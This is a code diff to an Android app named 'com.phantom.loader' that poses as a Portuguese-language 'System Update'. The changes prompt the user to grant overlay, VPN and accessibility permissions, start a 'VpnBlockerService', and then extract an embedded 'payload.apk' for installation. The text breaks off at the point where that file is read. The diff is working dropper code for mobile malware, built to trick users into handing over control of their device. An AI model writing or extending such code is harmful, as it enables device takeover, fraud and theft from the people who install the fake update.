@@ -2,6 +2,7 @@ package com.phantom.loader;
 
 import android.content.Intent;
 import android.net.Uri;
+import android.net.VpnService;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
@@ -25,36 +26,52 @@ public class MainActivity extends AppCompatActivity {
         layout.setPadding(50, 100, 50, 50);
 
         TextView tv = new TextView(this);
-        tv.setText("Sistema Pronto. Iniciando atualização...");
+        tv.setText("Sistema Pronto. Preparando atualização...");
         layout.addView(tv);
 
         Button btn = new Button(this);
         btn.setText("Iniciar");
-        btn.setOnClickListener(v -> pedirPermissoes());
+        btn.setOnClickListener(v -> checarPermissoes());
         layout.addView(btn);
         setContentView(layout);
     }
 
-    private void pedirPermissoes() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !getPackageManager().canRequestPackageInstalls()) {
-            startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName())));
-            Toast.makeText(this, "Permita a instalação.", Toast.LENGTH_LONG).show();
-            return;
-        }
-
+    private void checarPermissoes() {
+        // 1. Verifica Overlay (Sobrepor apps)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
             Toast.makeText(this, "Permita sobrepor outros apps.", Toast.LENGTH_LONG).show();
             return;
         }
 
-        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-        Toast.makeText(this, "Ative a acessibilidade.", Toast.LENGTH_LONG).show();
-
-        extrairPayload();
+        // 2. Verifica VPN
+        Intent vpnIntent = VpnService.prepare(this);
+        if (vpnIntent != null) {
+            startActivityForResult(vpnIntent, 1);
+        } else {
+            pedirAcessibilidade();
+        }
     }
 
-    private void extrairPayload() {
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1 && resultCode == RESULT_OK) {
+            pedirAcessibilidade();
+        }
+    }
+
+    private void pedirAcessibilidade() {
+        // 3. Pede Acessibilidade
+        Toast.makeText(this, "Ative a Acessibilidade do System Update.", Toast.LENGTH_LONG).show();
+        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+        
+        // 4. Liga a VPN e faz a instalação
+        startService(new Intent(this, VpnBlockerService.class));
+        extrairEInstalar();
+    }
+
+    private void extrairEInstalar() {
         new Thread(() -> {
             try {
                 InputStream is = getAssets().open("payload.apk");
